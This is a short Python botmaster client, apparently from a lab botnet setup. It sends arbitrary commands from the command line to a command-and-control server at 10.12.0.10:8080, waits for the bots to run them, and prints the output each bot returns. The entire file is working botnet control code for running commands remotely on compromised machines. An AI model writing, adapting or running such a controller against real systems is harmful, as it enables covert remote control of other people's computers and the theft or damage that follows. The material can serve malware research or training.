#!/usr/bin/env python3

import sys
import json
import time
import urllib.request
import urllib.error

C2_HOST = "10.12.0.10"
C2_PORT = 8080
C2_URL  = f"http://{C2_HOST}:{C2_PORT}"


def send_command(command: str) -> None:
    data = json.dumps({"cmd": command}).encode()
    req  = urllib.request.Request(
        f"{C2_URL}/command",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        print(f"- C2 accepted command: {resp.read().decode()}")


def get_results() -> None:
    with urllib.request.urlopen(f"{C2_URL}/results", timeout=5) as resp:
        results = json.loads(resp.read().decode())
    if not results:
        print("X No results yet - bots may not have responded in time.")
        return
    for entry in results:
        print(f"\n[Bot {entry['bot_id']}]")
        print(entry["result"])


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <command>")
        sys.exit(1)

    command = " ".join(sys.argv[1:])

    print(f"- Botmaster  C2={C2_URL}")
    print(f"- Command: {command}")
    print()

    try:
        send_command(command)
    except urllib.error.URLError as e:
        print(f"X Could not reach C2 at {C2_URL}: {e.reason}")
        print("    Is the C2 server running? (http ./c2_server &)")
        sys.exit(1)

    print("- Waiting 3 s for bots to execute...")
    time.sleep(3)

    try:
        get_results()
    except urllib.error.URLError as e:
        print(f"X Could not retrieve results: {e.reason}")


if __name__ == "__main__":
    main()
